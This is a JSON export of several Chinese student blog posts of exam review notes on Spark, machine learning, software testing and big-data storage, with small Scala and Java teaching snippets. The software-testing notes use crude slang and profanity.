[{"title":"Spark大数据分析技术期末复习","date":"2022-06-21T13:26:31.000Z","path":"2022/06/21/Spark大数据分析技术期末复习/","text":"Spark大数据分析技术期末题型作者：hyn 2022.6.25 于湘潭 题型： 选择：10 * 2’ 简答：10 * 5’ 编程：2 * 15’ 重点：第一章 1.1.2 Spark的优点 1.1.4 Spark的生态系统 1.2.3 Spark应用执行的基本流程 1.4 Spark编程 第二章 一道编程题 几道scala语法选择题 第三章 3.1 RDD创建 3.2 RDD操作（转换，行动操作的定义、区别，宽窄依赖） 3.4 RDD持久化 第五章 （DataFrame、DataStream和RDD的联系与区别） DataFrame的常用操作 第六章（动、静态数据） 6.1 流计算 6.2 Spark Streaming运行原理 6.5 操作DStream 第七章 7.2.1 属性图 7.2.2 GraphX图存储模式 第八章 Spark在ML上的优势 复习开始第一章Spark的优点（简答题）Spark是基于内存计算的大数据并行计算框架。 运行速度快 易用性好 通用性强 兼容性好 Spark的生态系统（选择题） 应用层：Spark SQL、Spark Streaming、Spark GraphX、Spark MLlib 数据处理引擎(核心层)：Spark Core 资源管理层：MESOS、YARN、Standalone 数据储存层：HDFS、Amazon S3、Hbase、Hive Spark core是Spark生态系统的核心组件，是一个分布式大数据处理框架。Spark core提供了多种资源调度管理，通过内存计算、DAG分布式并行计算等机制保证分布式计算的快速。并引入了RDD抽象数据类型保证数据的高容错性。 Spark应用执行的基本流程（简答题） 第二章编程题 创建一个列表{1，7，9，8，0，3，5，4，6，2}，将列表中每个元素乘以10后生成一个新的集合 ~~~scalaval list1[Int] = List(1,7,9,8,0,3,5,4,6,2)val list2[Int] = list1.map(_*10)123456789101112131415 - - 编写函数实现：输入一个数字，如果为正数，则他的signum为1；如果是负数，则他的signum为-1；如果为0，则他的signum为0. - ~~~scala def signum(n: Double): Double = &#123; if (n &gt; 0) &#123; 1 &#125; else if (n &lt; 0) &#123; -1 &#125; else &#123; 0 &#125; &#125; 第三章RDD创建（简答题/选择题）RDD是Spark对数据进行的核心抽象，一个不可变的分布式对象集合。RDD本质上是一个只读的分区记录集合，每个分区就是一个数据集片段。Spark中的所有操作都是基于RDD进行的。一个Spark应用可以看作一个由RDD创建到一系列的RDD转化操作，再到RDD存储的过程。 RDD的创建可以分为： 使用程序中的数据集创建RDD： 通过并行化数据集合来创建RDD，就是通过调用SparkContext中的parallelize（）方法并行化数据到集群的节点上形成一个分布式的数据集合，也就是一个RDD。 使用文本文件创建RDD 调用SparkContext的textFile()方法读取文件的位置即可创建RDD 使用JSON文件创建RDD 读取JSON文件创建RDD最简单的方法就是将JSON文件作为文本文件读取。即调用textFile()方法。 使用CSV文件创建RDD 依然是使用textFile()方法读取csv文件创建RDD RDD操作（编程题）RDD操作分为： 转换操作 RDD的转换操作是返回新的RDD的操作，RDD转换操作是惰性求值的，只有在行动操作中用到这些RDD时才会被转换。 行动操作 collect()行动操作方法可以将RDD类型的数据转化为Array数据并返回到Driver端 RDD实例解析1：找出文本文件中单行文本所包含的单词数量的最大值 ~~~scalascala&gt; val lines = sc.textFile(“file:///D:/spark-2.4.5-bin-hadoop2.7/test/data.txt”)scala&gt; lines.map(line =&gt;line.split(“”).size).reduce((a,b)=&gt;if(a&gt;b) a else b) 123456789101112 - - 上面代码中lines是一个RDD，是String类型的RDD - lines.map()，是一个转换操作，之前说过，map(func)：将每个元素传递到函数func中，并将结果返回为一个新的数据集，所以，lines.map(line =&gt; line.split(” “).size)会把每行文本都传递给匿名函数，也就是传递给Lamda表达式line =&gt; line.split(” “).size中的line，然后执行处理逻辑line.split(” “).size。line.split(” “).size这个处理逻辑的功能是，对line文本内容进行单词切分，得到很多个单词构成的集合，然后，计算出这个集合中的单词的个数。因此，最终lines.map(line =&gt; line.split(” “).size)转换操作得到的RDD，是一个整型RDD，里面每个元素都是整数值（也就是单词的个数）。最后，针对这个RDD[Int]，调用reduce()行动操作，完成计算。reduce()操作每次接收两个参数，取出较大者留下，然后再继续比较，例如，RDD[Int]中包含了1,2,3,4,5，那么，执行reduce操作时，首先取出1和2，把a赋值为1，把b赋值为2，然后，执行大小判断，保留2。下一次，让保留下来的2赋值给a，再从RDD[Int]中取出下一个元素3，把3赋值给b，然后，对a和b执行大小判断，保留较大者3.依此类推。最终，reduce()操作会得到最大值是5。- RDD实例解析2：给定一组键值*(“spark”,2),(“hadoop”,6),(“hadoop”,4),(“spark”,6)，键值对的key表示图书名称，value表示某天图书销量，请计算每个键对应的平均值，也就是计算每种图书的每天平均销量。 - ~~~scala scala&gt; val rdd = sc.paralelize(Array(((&quot;spark&quot;,2),(&quot;hadoop&quot;,6),(&quot;hadoop&quot;,4),(&quot;spark&quot;,6))) scala&gt; rdd.mapValues(x=&gt;(x,1)).reduceByKey((x,y)=&gt;(x._1+y._1,x._2+y._2)).mapValues(x=&gt;(x._1/x._2)).collect() 首先构建一个数组，数组里面包含了四个键值对，然后，调用paralelize()方法生成RDD。针对构建得到的RDD，我们调用mapValues()函数，把RDD中的每个键值对(key,value)的value部分进行修改，把value转换成键值对(value,1),其中，数值1表示这个key在RDD中出现了一次。 这里，必须要十分准确地理解reduceByKey()函数的功能。reduceByKey(func)的功能是使用func函数合并具有相同键的值。这里的func函数就是Lamda表达式(x,y) =&gt; (x._1+y._1,x._2 + y._2)，这个表达式中，x和y都是value，而且是具有相同key的两个键值对所对应的value，比如，在这个例子中， (“hadoop”,(6,1))和(“hadoop”,(4,1))这两个键值对具有相同的key，所以，对于函数中的输入参数(x,y)而言，x就是(6,1)，x._1表示这个键值对中的第1个元素6，x._2表示这个键值对中的第二个元素1，y就是(4,1)，y._1表示这个键值对中的第1个元素4，y._2表示这个键值对中的第二个元素1，所以，函数体(x._1+y._1,x._2 + y._2)，相当于生成一个新的键值对(key,value)，其中，key是x._1+y._1，也就是6+4=10，value是x._2 + y._2，也就是1+1=2，因此，函数体(x._1+y._1,x._2 + y._2)执行后得到的value是(10,2)，但是，要注意，这个(10,2)是reduceByKey()函数执行后，”hadoop”这个key对应的value，也就是，实际上reduceByKey()函数执行后，会生成一个键值对(“hadoop”,(10,2))，其中，10表示hadoop书籍的总销量，2表示两天。同理，reduceByKey()函数执行后会生成另外一个键值对(“spark”,(8,2))。 RDD属性（选择题）RDD分区的一个分区原则是使得分区的个数尽量等于集群中的CPU核心数目。 宽依赖：父分区一对多子分区 窄依赖：父分区一对一子分区 RDD持久化（选择题）在Spark中RDD采用惰性求值机制，每次遇到行动操作，都会从头开始执行计算。如果整个Spark程序中只有一次行动操作，这当然不会有什么问题。但是，在一些情形下，我们需要多次调用不同的行动操作，这就意味着每次调动行动操作，都会触发一次从头开始的计算，这对迭代计算而言，代价是很大的，迭代计算经常需要多次重复使用同一组数据。 第五章RDD与DataFrame联系与区别（简答题）共性： RDD、 DataFrame都是spark平台下的分布式数据集，为处理超大型数据提供便利； 都有惰性机制，在进行创建、转换时，不会立即执行，只有在遇到行动算子的时候才会开始计算； 都会根据Spark的内存情况进行自动缓存计算，这样即使数据量很大，也不会担心内存溢出； 区别： RDD RDD 一般和spark MLlib同时使用 RDD不支持spark sql操作 DataFrame DataFrame每一行的类型固定为Row，每一列的值无法直接访问，只有通过解析才能获取各个字段的值； DataFrame和DataSet一般不与spark mllib同时使用 DataFrame和DataSet均支持sparksql操作 DataFrame的常用操作 展示数据 筛选 排序 汇总和聚合 统计 合并 连接 第六章流计算（选择题）流数据是一组顺序、大量、快速、连续到达的数据序列，可被视为一个随时间延续而无限增长的动态数据集合。 Spark Streaming运行原理（简答题/选择题）Spark Streaming的基本原理是将实时输入数据流以时间片为单位进行拆分，然后经Spark引擎以类似批处理的方式处理每个时间片数据。每个输入批次都会形成一个RDD，Spark以作业的方式处理和生成其他RDD，最终通过行动操作生成中间结果。 操作DStream（选择题/简答题）对于从数据源得到的Dstream，用户可以在其上进行各种操作。这些方法主要分为三类： 无状态转换操作：每次对新的批次数据进行处理时，只会记录当前批次数据的状态，不会记录历史数据的状态信息。 有状态转换操作：当前批次的处理需要使用之前批次的数据或者中间结果。 基于滑动窗口的转换 追踪状态变化的转换 输出操作：外部系统经常需要使用到Spark DStream处理后的数据，因此，需要采用输出操作把DStream的数据输出到数据库或者文件系统中。 第七章属性图（简答题）GraphX的数据处理模型是弹性分布式属性图（Property Graph），属性图是由带有属性信息的顶点和边构成的图，这些属性主要用来描述节点和边的特征。 一个属性图具体包括： 顶点标识与顶点属性所组成的集合 边标识与边属性所组成的集合 属性图的例子： 如微博社交网络图所示，图中顶点集Vertex={1, 2, 3}有3个顶点，图中边集Edge={“粉丝”, “创建”, “转发”}有3条边。 顶点1和顶点2分别表示用户菲菲和乔乔，顶点3表示发布的某条微博。表示用户的顶点可以具有姓名和年龄等属性信息，表示微博的顶点可以具有微博内容和发布时间等属性信息。顶点与顶点之间的关系用有向边表示，具体有粉丝关系、创建关系和转发关系。边的属性可以是具体的关系信息，也可以是具体的数值。 GraphX图存储模式（简答题）在分布式环境下处理图数据，必须对图数据进行有效的图分割。图分割的分布式存储大致有两种方式，边分割（Edge Cut）存储，点分割（Vertex Cut）存储。 边分割模式： 边分割是保持图的顶点在各计算节点均匀分布，每个顶点都储存一次。 点分割模式： 点分割是保持各个边在各计算节点均匀分布，每条边只储存一次。 第八章Spark在MLlib上的优势（简答题） Spark非常适合进行迭代计算，刚好能适应机器学习对迭代计算的需要。 从通信角度讲，Spark具有出色而高效的Akka和Netty通信系统，通信效率高 MLlib基于RDD可以与Spark SQL、GraphX、Spark Streaming无缝集成","comments":true,"categories":[{"name":"人工智能","slug":"人工智能","permalink":"http://1905060202.github.io/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"}],"tags":[{"name":"期末复习","slug":"期末复习","permalink":"http://1905060202.github.io/tags/%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/"},{"name":"八股文","slug":"八股文","permalink":"http://1905060202.github.io/tags/%E5%85%AB%E8%82%A1%E6%96%87/"},{"name":"大数据分析","slug":"大数据分析","permalink":"http://1905060202.github.io/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/"},{"name":"Spark","slug":"Spark","permalink":"http://1905060202.github.io/tags/Spark/"}]},{"title":"机器学习期末复习","date":"2022-06-19T10:13:16.000Z","path":"2022/06/19/机器学习期末复习/","text":"机器学习期末题型一、考试题型： 名词解释：4 * 5’ （回归分析，马尔科夫，预剪枝）-必拿分 20分 简答题：5 * 10’ （决策树条件，随机森林条件、常见的聚类方法、卷积神经网络的计算）-拿35+分 35+分 算法改进题：15’（加惩罚项，正则项，损失函数）5+分 问答题：15’（机器学习应用于生活）-必拿分 15分 争取拿75+分 二、重点： 机器学习的应用 监督学习（分类，回归），无监督学习（聚类，降维），强化学习，深度学习 过拟合，欠拟合，泛化 评估方法：留出法，交叉验证法，自助法 性能度量：均方误差（分类错误率，精度） 混淆矩阵（web搜索，信息检索） ROC图（AUC值衡量了样本预测的排序质量） 代价敏感错误率（多分类） 性能评估：在统计学范畴内估计是否有显著提升（t检验，Fridman检验） 线性回归：公式， **最小二乘法（改进：加正则项（岭回归，套索回归））** 对数线性回归（降低量级差异） 线性判别分析（LDA）监督降维技术 类内尽可能接近，类间尽可能远 最大化目标：公式 必考： 决策树算法：ID3，C4.5，CART，RF（目前最好） 决策树判断条件 信息增益，信息增益率，基尼系数 HMM能解决的问题 卷积神经网络的计算： ​ 梯度消失，梯度爆炸 常见聚类方法： 原型模型：K均值聚类 密度模型：DBSCAN 层次模型：AGNES 机器学习期末复习名词解释回归分析 回归分析是处理多变量间相关关系的一种数学方法 回归分析可以解决以下问题： 建立变量间的数学表达式 利用概率统计基础知识进行分析 进行因素分析 回归分析步骤： 确定进行预测的因变量 集中说明变量，进行多元回归分析 回归分析可以分为： 线性回归分析 逻辑回归分析 马尔可夫性如果一个过程的“将来”，仅依赖“现在”而不依赖“过去”，则此过程具有马尔科夫性，或称此过程为马尔可夫模型。 预剪枝是剪枝方法中的一种策略。为了对付“过拟合”情况，提前终止某些分支的生长，称为预剪枝策略。 过拟合与欠拟合 欠拟合：是指模型不能在训练集上获得足够低的误差。换句话说，就是模型复杂度过低，模型在训练集上就表现很差，没法学习到数据背后的过滤。 解决方法：通过增加网络复杂度或者在模型中增加特征 过拟合：是指训练误差和测试误差之间差距很大。换句话说，就是模型复杂度高于实际问题，模型在训练集上表现很好，但是在测试集中表现却很差 解决方法：使用正则化方法 泛化能力泛化能力是指一个机器学习算法对于没有见过的样本的识别能力。 简答题机器学习的一些概念机器学习机器学习的主要任务： 分类：将实例数据划分到合适的类别中 回归：主要用于预测数值型数据 机器学习可以分为三种形式： 监督学习 非监督学习 强化学习 监督学习、无监督学习、强化学习与深度学习区别 监督学习：必须确定目标变量的值，以便机器学习算法可以发现特征和目标变量之间的关系。 监督学习包括： 分类 回归 无监督学习：在未加标签的数据中，试图找到隐藏的结构。数据没有类别信息，也没有给定的目标值。 无监督学习包括的类型： 聚类：将数据集分成由类似的对象组成多个类 密度估计：通过样本分布的紧密程度，来估计与分组的相似性 降维 强化学习：智能系统从环境到行为映射的学习，以使强化信号函数值最大。 最关键的三个因素： 状态 行为 环境奖励 深度学习：DNN可以将原始信号直接作为输入值，而不需要创建任何的输入特征。通过多层神经元，DNN可以自动在每一层产生适当的特征，最后提供一个非常好的预测，极大消除了寻找“特征工程”的麻烦。 DNN演变的网络拓扑结构： CNN(卷积神经网络) RNN(递归神经网络) LSTM(长期短期记忆网络) GAN(生成对抗网络) 评估方法 留出法：将数据集换分为两个互斥部分，一部分作为训练集，一部分作为测试集。通常训练集和测试集比例为70%：30%。 交叉验证法：将数据集换分为k个大小相似的互斥子集，每次采用k-1个子集的并集作为训练集，剩下的那个子集作为测试集。进行k次训练和测试，最总返回k个测试结果的均值。 自助法：以自主采样为基础，每次随机从数据集D(样本数m个)中挑选一个样本，放入D’中，然后将样本放回D中，重复m次后，得到了包含m个样本的数据集。 决策树决策树算法 第一个决策树算法：CLS 使决策树受到关注、成为机器学习主流技术的的算法：ID3 最常用的决策树算法：C4.5 可用于回归任务的决策树算法：CART 基于决策树的强大算法：RF 决策树的三种停止条件是什么？ 当前节点包含的样本全属于同一类别，无需划分 当前属性集为空，或是所有样本在属性集上取值相同，无法划分 当前节点包含的样本集合为空，不能划分 信息增益，信息增益率，基尼系数？信息增益、信息增益率、基尼系数，都是用来选择划分属性的一种手段，分别被用于不同的算法之中。 信息增益是用来选择划分属性的一种手段，信息增益对可取值数目较多的属性有所偏好。(ID3使用) 为了方便理解上面这句话，下面给出老师ppt里面的例子。 例子： 增益率：先从候选划分属性中找出信息增益高于平均水平的，再从中选取增益率最高的。(C4.5算法使用) 基尼系数：在侯选属性集合中，选取那个使划分后基尼系数最小的属性。(CART算法使用) 剪枝划分选择的各种准则对决策树的尺寸有较大的影响，但对泛化性能的影响很有限。 剪枝方法和程度对决策树泛化性能的影响更为显著！ 剪枝是决策树对付过拟合的主要手段！ 剪枝的策略 预剪枝：提前终止某些分支的生长 后剪枝：生成一颗完全树，再“回头”剪枝 预剪枝就像一个生长的小树，随着她增长，剪掉她的枝叶。后剪枝就像一颗已经长大的参天大树，剪掉他的一些分支。 隐马尔可夫模型HMM的状态是不确定的或不可见的，只有通过观测序列的随机过程才能表现出来。 HMM是一个双重随机过程，两个部分组成： 马尔可夫链：描述状态的转移，用转移概率描述 一般随机过程：描述状态与观察序列间的关系，用观察值概率描述 HMM可以解决的问题 评估问题：给定观察序列O=O1,O2,…OT,以及模型λ =(π，A，B), 如何计算P(O|λ)？ Forward-Backward算法 解码问题：给定观察序列O=O1,O2,…OT以及模型λ,如何选择一个对应的状态序列S = q1,q2,…qT，使得S能够最为合理的解释观察序列O？ Viterbi算法 学习问题：n如何调整模型参数λ =(π，A，B),对于给定观测值序列O=O1,O2,…OT，使得P(O|λ)最大？ Baum-Welch算法 卷积神经网络常见的聚类方法 原型聚类： **k均值聚类(k-means)**，高斯混合聚类 密度聚类： DBSCAN 层次聚类： AGNES 问答题（15救命分，必拿）机器学习应用于生活 图像识别 银行手写支票识别 Google从Youtube视频中提取出千万张图片，让系统自动判断哪些是猫的图片 2016年，DeepMind的AlpahGo击败了专业围棋选手 语音识别 科大讯飞公司的语音识别 微软的语音视频检索系统 自然语言处理 医疗保健 退伍军人创伤后成长计划与IBM Watson合作使用人工智能和分析技术，以确保更多患有创伤后应激障碍反应的退伍军人能够完成心理治疗","comments":true,"categories":[{"name":"人工智能","slug":"人工智能","permalink":"http://1905060202.github.io/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"}],"tags":[{"name":"期末复习","slug":"期末复习","permalink":"http://1905060202.github.io/tags/%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/"},{"name":"八股文","slug":"八股文","permalink":"http://1905060202.github.io/tags/%E5%85%AB%E8%82%A1%E6%96%87/"},{"name":"机器学习","slug":"机器学习","permalink":"http://1905060202.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}]},{"title":"软件测试技术期中考试复习","date":"2022-05-18T11:31:50.000Z","path":"2022/05/18/软件测试技术期中考试复习/","text":"概念与应用问题 缺陷的概念，缺陷的等级？缺陷来源于什么？表现在哪些方面？ 缺陷报告必须要包含的一些基本信息是什么？包括哪些部分？ 决策表法（重点），决策表法设计测试用例（大题） 什么是黑盒测试？什么是白盒测试？什么是性能测试？什么是压力测试？什么是自动化测试？ 边界值法的测试用例（大题） 基本路径覆盖（大题），绘制出控制流图，设计最基本的测试用例（54页） 测试需求分析需要做哪两方面的事情？ 测试用例是做什么用的？用来解决什么问题？ 判定覆盖的基本思想是什么？它是怎么做的？条件覆盖呢？ 什么是有效等价类？什么是无效等价类？ 软件测试解决了一个什么问题？：展开讨论 接口测试的一个目的何在？为什么要进行接口测试？在进行白盒/黑盒测试的时候，黑盒测试怎么测试的？他起到什么作用，在什么情况下，要用白盒测试法，白盒测试法的作用是什么？ 因果图、正交法（补充） 1-4章范围之内，考察最基本的概念，主要分值在第三章 题型填空 测试需求分析需要做哪两方面的事情？ 缺陷报告的主要组成部分 名词解释*20 什么是性能测试？什么是压力测试？什么是自动化测试？ 缺陷的概念 什么是有效等价类？什么是无效等价类？ 简答*30 缺陷来源于什么？表现在哪些方面？ 软件测试解决了一个什么问题？：展开讨论 接口测试的一个目的何在？为什么要进行接口测试？ 在进行白盒/黑盒测试的时候，黑盒测试怎么测试的？他起到什么作用，在什么情况下，要用白盒测试法，白盒测试法的作用是什么？ 黑盒测试是通过什么方法来发现错误的？ 判定覆盖的基本思想是什么？它是怎么做的？条件覆盖呢？ 综合题*40 决策表法（重点），决策表法设计测试用例（大题） 边界值法的测试用例（大题） 基本路径覆盖（大题），绘制出控制流图，设计最基本的测试用例（54页） 软件测试大复习第一章为什么要进行软件测试？他的必要性？软件测试是软件质量保证的关键步骤 软件测试和质量保障的关系SQA(软件质量保证)与软件测试之间相辅相成，既存有包含又存有交叉的关系。 SQA指导、监督软件测试的计划和执行，督促测试工作结果客观、准确和有效，并协助测试流程的改进。 软件测试是SQA重要手段之一，为SQA提供所需的数据，作为质量评价的客观依据。 第二章软件缺陷的定义，表现在哪些方面？ 软件缺陷的定义： 从产品内部看，软件缺陷是软件产品开发或维护过程中所存在的错误、毛病等各种问题 从外部看，软件缺陷是系统所需要实现的某种功能的失效或违背 软件测试缺陷表现在： 需求规格说明书有问题（需求分析问题） 用户界面不美观（系统设计问题） 设计不合理，存在缺陷（系统设计问题） 用户不能接受的其他问题（系统设计问题） 运行出错（系统设计问题） 数据计算错误（编程阶段问题） 功能、特性没有实现或者部分实现（编程阶段问题） 在某种特定条件下没能给出正确和准确的结果（编程阶段问题） 软件缺陷的构成？ 需求分析 系统设计 编程阶段 缺陷报告的主要组成部分（填空） 标题 操作步骤 期望结果 实际结果 软件缺陷的按严重性的等级划分？（或许是简答题） 致命的：不能执行正常工作功能或重要功能，或者危及人身安全 严重的：严重地影响系统要求或基本功能的实现，不能执行正常工作或重要功能，没有办法更正 一般的： 操作界面不规范 操作者感到不方便或者麻烦 辅助说明描述不清楚 长时间操作但不给用户提示，类似死机 微小的：其他缺陷或建议类缺陷 什么是软件测试报告？由哪几方面组成？（或许是简答题） 软件测试报告：测试报告是指把测试的过程和结果写成文档，对发现的问题和缺陷进行分析，为纠正软件的存在的质量问题提供依据，同时为软件验收和交付打下基础 软件测试报告由哪几方面组成： 概述 测试对象和概要 测试结果及发现 对软件功能的结论 分析摘要 测试资源消耗 测试需求分析需要做哪两方面的事情？（或许是填空） 详细了解并深挖需求 确定测试范围 软件测试的几大分类？（包含许多考点） 按层次分类： 底层测试 接口层次： 软件接口测试是测试系统组件间接口的一项测试工作 软件接口测试是以保证系统正确和文档为核心，以持续集成为手段，主要为了提高测试效率，以及降低产品开发成本 系统层次 用户层次 按被测试的对象分类： 单元测试 程序测试 系统测试 文档测试 web应用测试 数据库测试 按测试阶段划分 按测试目的划分 功能测试：验证每个功能是否按照事先定义的要求那样正常工作 压力测试：用来检测系统在不同负载条件下的系统运行情况，特别是高负载、极限负载下的系统运行情况，以发现系统的不稳定、系统性能瓶颈、内存泄漏、CPU使用率过高等 性能测试：通过自动化的测试工具模拟多种正常、峰值以及异常负载条件来对系统的各项性能指标进行测试。 回归测试：是指对软件的新版本测试时，重复执行之前某一个重要版本的所有测试用例 冒烟测试：指在对一个新版本进行系统大规模的测试之前，先验证一下软件的基本功能是否实现，是否具备可测性 自动化测试：利用工具软件，或者编写代码的方法，测试被测的软件系统 静态测试与动态测试的概念？根据程序是否运行，测试可以分为静态测试和动态测试。 静态测试：指不实际运行被测对象，而只是静态的检查程序代码、界面或文档中可能存在错误的过程 动态测试：实际运行实测对象，输入相应的测试数据，检查实际输出结果和预期结果是否相符的过程或观察代码的运行来获取各方面信息的过程 黑盒测试与白盒测试？ 白盒测试：已知产品的内部工作过程，清楚最终生成软件产品的计算机程序结构及其语句，按照程序内部的结构测试程序。 黑盒测试：在测试时，完全不考虑程序内部结构和内部特性，针对软件直接进行测试。 二者可以通过： 静态测试方法 动态测试方法 发现缺陷 测试计划与测试用例？ 测试计划：为了高效地、高质量地完成测试任务而做的准备工作，包括对工作量的估算、测试资源和进度安排、测试风险评估、测试策略制定等工作。 内容： 目标和范围 项目估算 风险计划 进度安排 资源配置 跟踪和控制机制 测试用例：为了特定的测试目的而设计的测试条件、测试数据以及与之相关的测试规程的一个特定的使用实例或场景。 意义： 测试用例是测试人员在测试过程中的重要参考依据 测试用例将有助于节约测试时间，提高测试效率 良好的测试用例不断地被重复使用，使得测试过程事半功倍 测试用例是一个知识积累的过程 第三章（最重要的一章）有效等价类与无效等价类 无效等价类是指对于软件规格说明而言，没有意义的、不合理的输入数据集合 有效等价类指输入完全满足程序输入的规格说明，有效、有意义的输入数据所构成的集合。 决策表设计测试用例（挺有意思）看这篇文章，通俗易懂：决策表设计测试用例如何设计？ 如果你是懒比，那看下面的小妙招就可以学会什么是决策表/判定表设计测试用例。 决策表/判定表这个东西主要由四个东西组成，由条件桩、条件项、动作桩、动作项组成。这些勾八概念不是人听的，但是要记住，因为可能考名词解释或者是简答题。我们先把这个决策表以表格的形式整出来。 序号 1 2 3 4 是否在寝室 Y Y N N 手机能否看片 Y N Y N 打胶 √ √ √ 睡觉 √ 序号下面的：是否在寝室、手机能否看片是条件桩，而打胶、睡觉则是动作桩。那么条件项就是是否在寝室、手机能否看片后面的1234，动作桩同理。 这便是最初的初始化判定表，还有个优化判定表。这是个什么鸡儿东西呢？ 我们观察到，13或许可以合并一下，因为动作项√号位置相同，而条件项只有是否在寝室不同，那么我们就可以把他们合并，合并成如下的形式： 1/3 - Y √ (-)代表Y/N都有，是无关条件，由于合并之后的无关条件项(-)包含其他条件项取值,因此具有相同动作的规则还可进一步合并，这里要注意：1/3与4不能再合并了，因为除了无关条件之外，并没有条件项一样的了。 于是，我们的合并旅程结束了，得到的优化判定表如下： 序号 1/3 2 4 是否在寝室 - Y N 手机能否看片 Y N N 打胶 √ √ 睡觉 √ 由此我们得到了一个更牛逼的测试用例，只需要三组就可以达到之前四组才能测出程序缺陷的效果。为啥呢，因为你无论在不在寝室，只要你手机能看片，你也能打胶。 下面我们来点名词解释： 条件桩：列出问题的所有条件 动作桩：列出可能针对问题所采取的操作 条件项：针对所列条件的具体赋值 动作桩：列出在条件项组合情况下应该采取的动作 边界值法设计测试用例（勾八题目）实践证明，程序往往在输入输出边界值情况下发生错误。边界包括输入等价类和输出等价类的大小边界，程序检查边界情况的测试用例是比较高效的，可以查出更多错误。 边界值分析法定义边界分析法就是在某个输入输出变量范围的边界上，验证系统功能是否正常运行的测试方法。 这题据说考计算题，是真勾八啊，这题考鸡毛计算题啊！？ 简而言之，软件测试所包含的边界检验有几种类型:数字、字符、位置、质量、大小、速度、方位、尺寸、空间等等，而相应的边界值就是最大/最小、首位/末尾、上/下、最快/最慢、最高/最低、最短/最长、空/满等。 小妙招： 比如计算闰年小程序，我们计算边界值，就可以选年月日的边界组合，一共有八种，年超界，月不超，日不超…等等。还可以钻特殊值，比如2月28号这种。 基本路径覆盖 计算复杂度（这题还有点含金量）顾名思义，基本路径覆盖就是设计所有的测试用例，来覆盖程序中的所有的可能的、独立的执行路径。 重要的是画程序流图和计算程序环路复杂度。 因为谈到基于逻辑的覆盖方法了，那就直接把要考的所有关于此的考点都罗列在这个子问题下面，也方便理解什么是基本逻辑覆盖。 判定覆盖判定覆盖的基本思想是设计若干用例，运行被测程序，使得程序中每个判断的取真分支和取假分支至少经历一次，即判断真假值均被满足。 条件覆盖条件覆盖的基本思想是设计若干测试用例，执行被测试程序以后，要使每个判断中每个条件的可能取值至少满足一次。 条件组合覆盖条件组合覆盖的基本思想是设计足够的测试用例，使得判断中每个条件的所有可能至少出现一次，并且每个判断本身的判定结果也至少出现一次。 这个就是把每个条件的组合写出来，它与条件覆盖的差别是他不是简单的要求每个条件都出现真与假两种结果，而是要求让这些结果的所有可能组合都至少出现一次。 我们拿个例子来说明： 程序代码： 12345678910111213141516171819202122// 假设Z=1，输入两个整数x,y，通过程序判断返回值ret。程序Demo如下public static int getNmb(int x,int y) &#123; int z = 1; int ret =0; if (x&lt;0)&#123; z=y-x; &#125; else&#123; z=y+x; &#125; if(z&lt;10 &amp;&amp; y&gt;0) &#123; ret = z*y; &#125; else &#123; ret= z*x; &#125; return ret; &#125; 程序流图： 判定覆盖： 003 与 004 分别走了abde NN分支和acdf YY分支，真假分支每个都遍历到了。 条件覆盖： 005与006 分别执行了x&lt;0 y&gt;0 z&gt;10条件与x&gt;0 y&lt;0 z&gt;10条件，x y的取的真假都遍历到了，而z的真缺了，这个当时做实验的实验暂时没想到怎么设计。 条件组合覆盖： 相当于把xyz的真假取值都遍历一遍，一共有八种可能。但这个程序我只搞出了6种，剩下的2种没想出来。 编号 执行条件 输入 期望输出 实际输出 执行路径 001 语句覆盖 x=2,y=-3 -2 -2 abde 002 语句覆盖 x=-5,y=4 36 36 acdf 003 判定覆盖 x=1,y=-2 -1 -1 abde 004 判定覆盖 x=-3,y=4 28 28 acdf 005 条件覆盖 x=-2,y=4 24 24 acdf 006 条件覆盖 x=15,y=-3 180 180 abde 007 判定条件覆盖 x=-2,y=4 24 24 acdf 008 判定条件覆盖 x=15,y=-3 180 180 abde 009 条件组合覆盖 x=-1,y=12 -13 -13 acde 010 条件组合覆盖 x=-15,y=-2 -195 -195 acde 011 条件组合覆盖 x=-1,y=1 2 2 acdf 012 条件组合覆盖 x=-5,y=-4 -5 -5 acde 013 条件组合覆盖 x=1,y=7 56 56 abdf 014 条件组合覆盖 x=8,y=-2 48 48 abde 基本路径覆盖结合条件组合覆盖和路径覆盖。路径覆盖就是执行路径的组合。 操了，写到这才发现这题目确实牛逼，我建议，如果有同学能把这题写出来，老师就直接给过吧，太几把费劲了。 写题目形式要这样： 测试用例 覆盖路径 覆盖条件 输入：x=-1,y=12,z=-13 输出：-13 acde T1,T2,F3 其中T1代表x&lt;0取True，若有F3，则表示z&lt;10取False。 覆盖组合就省略了，要不然还得用判定-条件组合来搞出覆盖组合，太麻烦了。 计算程序环路复杂度通过对控制流图的分析和判断来计算模块复杂性。环路复杂性可以用V(G)来表示，其计算方法是： V(G)=区域数目。区域是由边界和节点包围起来的形状所构成。计算区域时候应该包括图的外部区域，将其作为一个区域 如下图是上面的程序流图抽象出来的小黑点程序流程图 一共有3个区域，故复杂度为3 V(G)=边界数目-节点数目+2，从上图可以看出一共有8条边，7个节点，故有复杂度为3. V(G)=判断节点数目+1，如图，判断节点一个有两个，故复杂度为3.","comments":true,"categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://1905060202.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"期末复习","slug":"期末复习","permalink":"http://1905060202.github.io/tags/%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/"},{"name":"八股文","slug":"八股文","permalink":"http://1905060202.github.io/tags/%E5%85%AB%E8%82%A1%E6%96%87/"},{"name":"软件测试","slug":"软件测试","permalink":"http://1905060202.github.io/tags/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/"}]},{"title":"大数据存储技术八股文","date":"2022-05-16T14:41:36.000Z","path":"2022/05/16/大数据存储技术八股文/","text":"大数据存储技术八股文整理：csjh spxzx 前言：在老杨的基础之上，增添了些辅助理解的内容。重新绘制了一些图片，使它看起来更简洁易懂。删除了部分内容，redis的代码等，使文章读起来没那么硬核，降低学习门槛，让读者拥有60分飘过水平即可。 CAP理论CAP理论是分布式系统的理论基础。 一致性Consistency：在分布式系统中的所有数据备份，在同一时刻是否有同样的值 